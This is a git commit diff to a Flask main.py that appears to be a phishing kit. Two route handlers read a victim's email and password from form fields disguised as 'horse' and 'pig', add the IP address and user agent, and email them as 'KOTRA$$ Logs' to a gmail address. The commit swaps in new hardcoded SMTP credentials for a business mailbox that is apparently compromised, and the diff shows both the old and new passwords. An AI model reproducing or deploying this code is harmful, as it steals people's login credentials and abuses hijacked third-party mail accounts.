03e8a50f8eda6f3e808f63df80f6bb3e2ba33ad9
Coomatoso <coomatoso@coomatoso.com>
2026-05-18 14:47:54 +0200

    Update main.py

--- main.py
+++ main.py
@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "comercial@transportestierradentro.com"
-        sender_emaill = "comercial"
+        sender_email = "administracion@centrodecambios.com"
+        sender_emaill = "administracion"
         receiver_email = "kokofunds147@gmail.com"
-        password = "TTcomercial2021!"
+        password = "Evelyn19271534"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -210,7 +210,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("transportestierradentro.com", 465) as server:
+        with smtplib.SMTP_SSL("centrodecambios.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "comercial@transportestierradentro.com"
-        sender_emaill = "comercial"
+        sender_email = "administracion@centrodecambios.com"
+        sender_emaill = "administracion"
         receiver_email = "kokofunds147@gmail.com"
-        password = "TTcomercial2021!"
+        password = "Evelyn19271534"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
@@ -250,7 +250,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("transportestierradentro.com", 465) as server:
+        with smtplib.SMTP_SSL("centrodecambios.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
